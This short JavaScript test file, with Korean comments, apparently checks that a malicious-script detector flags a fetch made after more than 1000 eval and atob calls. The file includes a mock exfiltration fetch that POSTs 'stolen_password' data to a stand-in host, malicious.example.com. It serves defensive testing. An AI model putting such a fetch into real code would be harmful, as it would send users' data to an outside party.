// 테스트: 1000번 이상의 함수 호출 후 fetch를 호출하여 status=1이 되는지 확인

// 1000번 이상 함수를 호출하기 위해 반복문 사용
for (var i = 0; i < 1100; i++) {
    // eval 호출 (함수 호출 카운터 증가)
    eval("var x" + i + " = " + i);
    
    // atob 호출 (함수 호출 카운터 증가)
    if (i % 10 === 0) {
        atob("dGVzdA==");
    }
}

// 1000번 이상 호출 후 fetch 실행
// 이 fetch는 status=1로 탐지되어야 함
fetch("https://malicious.example.com/exfiltrate", {
    method: "POST",
    body: JSON.stringify({
        data: "sensitive_information",
        password: "stolen_password"
    })
});

// 정상적인 fetch (비교용)
fetch("https://legitimate.example.com/api/data", {
    method: "GET"
});
